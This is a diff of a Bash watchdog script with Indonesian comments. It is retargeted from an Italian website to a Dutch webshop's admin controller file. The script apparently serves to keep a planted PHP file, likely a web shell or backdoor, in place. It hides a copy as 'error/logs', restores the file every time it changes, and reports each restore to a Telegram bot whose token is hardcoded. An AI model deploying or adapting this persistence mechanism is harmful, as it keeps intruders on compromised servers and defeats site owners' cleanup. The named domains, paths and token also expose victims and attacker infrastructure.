@@ -1,13 +1,13 @@
 #!/bin/bash
 
 # Definisikan lokasi file index.php Permissions 755
-INDEX_FILE="/var/www/ideastile/public_html/system/admin.php"
+INDEX_FILE="/home/mooiwts234/domains/borstvoedingwebshop.nl/public_html/admin/controller/user/data-user.php"
 # Definisikan lokasi folder backup Permissions 755
-BACKUP_FOLDER="/var/www/ideastile/"
+BACKUP_FOLDER="/home/mooiwts234/domains/borstvoedingwebshop.nl/public_html/admin/controller/error"
 # Buat folder backup jika belum ada
 mkdir -p "$BACKUP_FOLDER"
 # Tentukan nama file backup Permissions 755
-BACKUP_FILE="$BACKUP_FOLDER/file_base"
+BACKUP_FILE="$BACKUP_FOLDER/logs"
 
 # Token dan ID chat Telegram
 TOKEN="7588613295:AAHNs_IOFuLy_weuOoKMPWaGobPMvtz5mp4"
@@ -39,8 +39,8 @@ monitor_file() {
             # Jika checksum berbeda, kembalikan file index.php dari backup
             echo "Change, mengembalikan backup..."
             cp "$BACKUP_FILE" "$INDEX_FILE"
-            echo "https://www.ideastile.it/system/admin.php."
-            send_telegram_notification "https://www.ideastile.it/system/admin.php. File admin.php Sudah dikembalikan ke versi backup." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
+            echo "https://borstvoedingwebshop.nl."
+            send_telegram_notification "https://borstvoedingwebshop.nl/admin/controller/user/data-user.php. File data-user.php Sudah dikembalikan ke versi backup." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
         fi
 
         # Tunggu 30 detik sebelum pengecekan selanjutnya
